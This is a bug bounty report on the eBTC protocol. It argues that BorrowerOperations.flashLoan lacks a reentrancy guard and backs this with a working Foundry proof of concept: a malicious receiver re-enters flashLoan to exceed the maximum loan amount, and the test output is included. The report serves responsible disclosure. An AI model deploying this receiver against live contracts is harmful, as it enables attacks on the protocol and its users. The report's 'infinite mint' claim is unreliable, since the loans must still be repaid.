# 28659 - \[SC - Insight] Reentrancy in BorrowerOperationsflashLoan enabl...

Submitted on Feb 23rd 2024 at 08:12:41 UTC by @OxG0P1 for [Boost | eBTC](https://immunefi.com/bounty/ebtc-boost/)

Report ID: #28659

Report type: Smart Contract

Report severity: Insight

Target: <https://github.com/ebtc-protocol/ebtc/blob/release-0.7/packages/contracts/contracts/BorrowerOperations.sol>

Impacts:

* Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Brief/Intro

Due to an reentrancy attack vector, an attacker can flashLoan an unlimited amount of eBTC. For example the attacker can create a malicious contract as the receiver, to execute the attack via the onFlashLoan callback .

The exploit works because BorrowerOperations.flashLoan() is missing a reentrancy protection (modifier).

As a result an unlimited amount of eBTC can be borrowed by an attacker via the flashLoan .

## Vulnerability Details

The BorrowerOperations.sol contract facilitates the execution of flash loans for eBTC. A user is permitted to loan a maximum amount of type(uint112).max. However, a vulnerability exists wherein an attacker can exploit the absence of the Reentrancy modifier in the BorrowerOperations.flashLoan() function. This oversight enables an attacker to potentially mint an infinite amount of eBTC tokens. By leveraging a malicious receiver implementation contract, the attacker can execute this exploit, posing a significant risk to the integrity and security of the eBTC ecosystem.

## Impact Details

An attacker can bypass the maxFlashloan amount and mint infinite amount of eBTC tokens.

## References

<https://github.com/ebtc-protocol/ebtc/blob/a96bd000c23425f04c3223a441a625bfb21f6686/packages/contracts/contracts/BorrowerOperations.sol#L1091-L1122>

## Proof of Concept

`Test :`

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.17;

import "forge-std/Test.sol";
import {eBTCBaseFixture} from "./BaseFixture.sol";
import {UselessFlashReceiver, eBTCFlashReceiver, FlashLoanSpecReceiver, FlashLoanWrongReturn} from "./utils/Flashloans.sol";

/*
 * Unit Tests for Flashloans
 * Basic Considerations:
 * Flash Fee can go to zero due to rounding, that's marginal
 * Minting is capped at u112 for UniV2 Compatibility, but mostly arbitrary
 */
contract FlashLoanUnitEBTC is eBTCBaseFixture {
    // Flashloans
    UselessFlashReceiver internal uselessReceiver;
    eBTCFlashReceiver internal ebtcReceiver;
    FlashLoanSpecReceiver internal specReceiver;
    FlashLoanWrongReturn internal wrongReturnReceiver;

    function setUp() public override {
        // Base setup
        eBTCBaseFixture.setUp();

        eBTCBaseFixture.connectCoreContracts();
        eBTCBaseFixture.connectLQTYContractsToCore();

        // Create a CDP
        address payable[] memory users;
        users = _utils.createUsers(1);
        address user = users[0];
        uint256 borrowedAmount = _utils.calculateBorrowAmount(
            30 ether,
            priceFeedMock.fetchPrice(),
            COLLATERAL_RATIO
        );
        // Make sure there is no CDPs in the system yet
        assert(sortedCdps.getLast() == "");
        vm.startPrank(user);
        collateral.approve(address(borrowerOperations), type(uint256).max);
        collateral.deposit{value: 30 ether}();
        borrowerOperations.openCdp(borrowedAmount, "hint", "hint", 30 ether);
        vm.stopPrank();

        uselessReceiver = new UselessFlashReceiver();
        ebtcReceiver = new eBTCFlashReceiver();
        specReceiver = new FlashLoanSpecReceiver();
        wrongReturnReceiver = new FlashLoanWrongReturn();
    }



    function testReenter() public{
        uint256 loanAmount = borrowerOperations.maxFlashLoan(address(eBTCToken));
        uint256 fee = borrowerOperations.flashFee(address(eBTCToken), loanAmount);
        deal(address(eBTCToken), address(ebtcReceiver), fee * 3); //Receiver implemntation should have eBTC to pay fee
        borrowerOperations.flashLoan(
            ebtcReceiver,
            address(eBTCToken),
            loanAmount,
            abi.encodePacked(uint256(0))
        );

        uint result = ebtcReceiver.trace();
        console.log(result); // The amount that the attacker minted
        console.log(loanAmount); //Maximum allowed amount that an user can mint

    }
}
```

`Receiver Implementation :`

```solidity
interface IborrowerOperations{
    function flashLoan( 
        IERC3156FlashBorrower receiver,
        address token,
        uint256 amount,
        bytes calldata data
    ) external  returns (bool);
}




contract eBTCFlashReceiver is IERC3156FlashBorrower {
    uint  goal =  5192296858534827628530496329220095 * 2; // Goal amount of the attacker which is type(uint112 ).max * 2
    uint public trace; 
    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external override returns (bytes32) {

        uint256 loanAmount = amount;
        trace += amount;
        if(trace < goal){ // Attacker keep calling the flashLoan until goal reached
            
            IborrowerOperations(msg.sender).flashLoan(
                IERC3156FlashBorrower(address(this)),
                address(token),
                loanAmount,
                abi.encodePacked(uint256(0))
        );
        }
        // Approve amount and fee
        IERC20(token).approve(msg.sender, amount + fee);

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}
```

`Test Results :`

```solidity
[PASS] testReenter() (gas: 275631)
Logs:
  10384593717069655257060992658440190
  5192296858534827628530496329220095
```
